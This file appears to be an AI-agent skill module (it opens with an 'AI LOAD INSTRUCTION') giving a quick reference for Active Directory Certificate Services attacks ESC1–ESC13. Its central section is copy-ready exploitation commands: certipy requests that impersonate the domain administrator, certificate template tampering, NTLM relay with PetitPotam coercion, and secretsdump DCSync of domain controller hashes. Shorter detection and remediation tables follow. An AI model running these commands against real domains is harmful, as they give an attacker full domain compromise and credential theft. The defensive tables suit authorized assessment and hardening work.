# AD CS ESC1–ESC13 Quick Reference Matrix

> **AI LOAD INSTRUCTION**: Load this for the complete ESC vulnerability matrix with conditions, impact, exploitation commands, and detection notes. Assumes the main [SKILL.md](./SKILL.md) is already loaded for AD CS concepts and detailed exploitation.

---

## 1. ESC VULNERABILITY MATRIX

| ESC | Name | Condition | Impact | Difficulty |
|---|---|---|---|---|
| **ESC1** | Enrollee Supplies SAN | Template: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enrollment | **Domain Admin** | Easy |
| **ESC2** | Any Purpose EKU | Template: Any Purpose (2.5.29.37.0) or no EKU + low-priv enrollment | **Domain Admin** | Easy |
| **ESC3** | Enrollment Agent | Enrollment agent template + second template allowing on-behalf-of | **Domain Admin** | Medium |
| **ESC4** | Template ACL | Write access to template object in AD | **Domain Admin** | Medium |
| **ESC5** | CA Object ACL | Write access to CA object or PKI-related containers | **CA Compromise** | Medium |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 | CA flag allows SAN in any request | **Domain Admin** | Easy |
| **ESC7** | CA Officer Abuse | ManageCA or ManageCertificates on CA | **Domain Admin** | Medium |
| **ESC8** | NTLM Relay to HTTP | HTTP enrollment endpoint without HTTPS/EPA | **Domain Admin** | Medium |
| **ESC9** | No Security Extension | StrongCertificateBindingEnforcement ≠ 2, CT_FLAG_NO_SECURITY_EXTENSION | **Impersonation** | Hard |
| **ESC10** | Weak Cert Mapping | CertificateMappingMethods includes UPN/implicit mapping | **Impersonation** | Hard |
| **ESC11** | NTLM Relay to RPC | CA RPC enrollment without encryption enforcement | **Domain Admin** | Medium |
| **ESC12** | CA on YubiHSM | Shell access to CA + YubiHSM key accessible | **Golden Cert** | Hard |
| **ESC13** | OID Group Link | Issuance policy OID linked to AD group + enrollable template | **Group Membership** | Medium |

---

## 2. ONE-LINER EXPLOITATION COMMANDS

### ESC1

```bash
# Enumerate
certipy find -u user@domain.com -p pass -dc-ip DC -vulnerable -stdout | grep -A 20 "ESC1"

# Exploit
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template VulnTemplate -upn administrator@domain.com

# Auth
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC2

```bash
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template AnyPurpose -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC3

```bash
# Step 1: Get enrollment agent cert
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template EnrollmentAgentTemplate

# Step 2: Request on behalf of admin
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template User -on-behalf-of 'DOMAIN\administrator' -pfx enrollmentagent.pfx

certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC4

```bash
# Modify template → ESC1
certipy template -u user@domain.com -p pass -template VulnTemplate -save-old -dc-ip DC

# Exploit as ESC1
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template VulnTemplate -upn administrator@domain.com

# Cleanup
certipy template -u user@domain.com -p pass -template VulnTemplate \
  -configuration VulnTemplate.json -dc-ip DC
```

### ESC6

```bash
# Verify flag
certutil -config "ca.domain.com\CORP-CA" -getreg policy\EditFlags
# Look for EDITF_ATTRIBUTESUBJECTALTNAME2

certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template User -upn administrator@domain.com
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC7

```bash
# Enable SubCA template (ManageCA)
certipy ca -u user@domain.com -p pass -ca CORP-CA -dc-ip DC -enable-template SubCA

# Request (gets denied to pending)
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template SubCA -upn administrator@domain.com
# Note the request ID

# Approve (ManageCertificates)
certipy ca -u user@domain.com -p pass -ca CORP-CA -dc-ip DC -issue-request ID

# Retrieve
certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com -retrieve ID
certipy auth -pfx administrator.pfx -dc-ip DC
```

### ESC8

```bash
# Setup relay
ntlmrelayx.py -t http://ca.domain.com/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Coerce DC
PetitPotam.py RELAY_HOST DC01.domain.com
# Or: printerbug.py DOMAIN/user:pass@DC01 RELAY_HOST

# Auth with captured cert
certipy auth -pfx dc01.pfx -dc-ip DC
# DCSync with DC machine account
secretsdump.py -hashes :DC01_HASH DOMAIN/DC01\$@DC -just-dc
```

### ESC11

```bash
ntlmrelayx.py -t "rpc://ca.domain.com" -rpc-mode ICPR -icpr-ca-name "CORP-CA" \
  -smb2support --adcs --template DomainController

# Coerce + capture same as ESC8
```

### ESC13

```bash
# Enumerate OID group links
certipy find -u user@domain.com -p pass -dc-ip DC -vulnerable -stdout | grep -A 10 "ESC13"

certipy req -u user@domain.com -p pass -ca CORP-CA -target ca.domain.com \
  -template ESC13Template
certipy auth -pfx user.pfx -dc-ip DC
# Verify group membership added
```

---

## 3. DETECTION INDICATORS

| ESC | Detection Method |
|---|---|
| ESC1/2 | Event 4887: certificate request with SAN different from requester |
| ESC3 | Event 4887: enrollment agent request + subsequent on-behalf-of |
| ESC4 | Event 5136: directory service object modification on template |
| ESC6 | Audit `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on CA |
| ESC7 | Event 4870/4882: CA configuration change |
| ESC8 | Network: NTLM authentication to HTTP enrollment endpoint |
| ESC9/10 | Event 4768: PKINIT auth with certificate mapping mismatch |
| ESC11 | Network: NTLM authentication to CA RPC interface |
| ESC13 | Event 4887: enrollment in template with OID group link |

---

## 4. TOOL COMPARISON

| Feature | Certipy (Python) | Certify (C#) | ForgeCert (C#) |
|---|---|---|---|
| **Platform** | Linux/Windows | Windows | Windows |
| **Enumerate** | Yes (`find`) | Yes (`find`) | No |
| **ESC1-4** | Yes | Yes | No |
| **ESC5-8** | Yes | Partial | No |
| **ESC9-13** | Yes (latest) | No | No |
| **Template modify** | Yes | No | No |
| **CA backup** | Yes | No | No |
| **Forge certs** | Yes (`forge`) | No | Yes |
| **Auth (PKINIT)** | Yes (`auth`) | No | No |
| **Relay integration** | Via ntlmrelayx | N/A | N/A |

---

## 5. REMEDIATION QUICK REFERENCE

| ESC | Fix |
|---|---|
| ESC1 | Remove `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` or restrict enrollment |
| ESC2 | Remove "Any Purpose" EKU, set specific EKU |
| ESC3 | Restrict enrollment agent template to specific users |
| ESC4 | Audit and restrict write ACLs on certificate templates |
| ESC6 | Remove `EDITF_ATTRIBUTESUBJECTALTNAME2` flag: `certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2` |
| ESC7 | Restrict ManageCA/ManageCertificates to necessary admins |
| ESC8 | Enforce HTTPS + EPA on enrollment endpoints; disable HTTP |
| ESC9/10 | Set `StrongCertificateBindingEnforcement = 2` on all DCs |
| ESC11 | Set `IF_ENFORCEENCRYPTICERTREQUEST` on CA RPC interface |
| ESC13 | Audit OID group links in issuance policies |
